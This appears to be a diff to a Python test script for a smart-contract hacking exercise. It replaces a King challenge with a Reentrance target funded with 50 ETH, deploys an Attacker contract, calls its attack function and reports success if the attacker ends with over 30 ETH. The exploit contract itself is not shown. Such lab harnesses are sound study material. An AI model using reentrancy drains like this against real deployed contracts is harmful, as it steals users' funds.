@@ -16,7 +16,10 @@ def main():
 
 def prepare():
     # deploy smart contract
-    target = King.deploy({'from': a0, 'value': 0.5*BIGNUMBER})
+    target = Reentrance.deploy({'from': a0})
+    target.donate(a0,{'from':a0, 'value':50*BIGNUMBER})
+    REPORT.add_token(target)
+    REPORT.add_contract(target, 'Target')
 
     # attacker should start with little ETH balance
     balance_to_burn = a1.balance() - 1*BIGNUMBER
@@ -30,17 +33,15 @@ def prepare():
 def attack(target):
 
     # attacker deploys its smart-contract, then attack happens
-    attacker = Attacker.deploy(target,{'from':a1, 'value': 0.6*BIGNUMBER})
+    attacker = Attacker.deploy(target,{'from':a1})
+    attacker.donate({'from':a1, 'value': 0.9*BIGNUMBER})
+    REPORT.add_contract(attacker, 'Attacker contract')
+    REPORT.print()
+
     attacker.attack({'from':a1})
+    REPORT.print()
 
-    # checking if contract broken
-    broken = False
-    try:
-        a0.transfer(target,2*BIGNUMBER)
-    except:
-        broken = True
-
-    if broken == True:
+    if a1.balance() > 30*BIGNUMBER:
         REPORT.txt_print('ATTACK SUCCESSFUL')
     else:
         REPORT.txt_print('ATTACK IS NOT SUCCESSFUL')
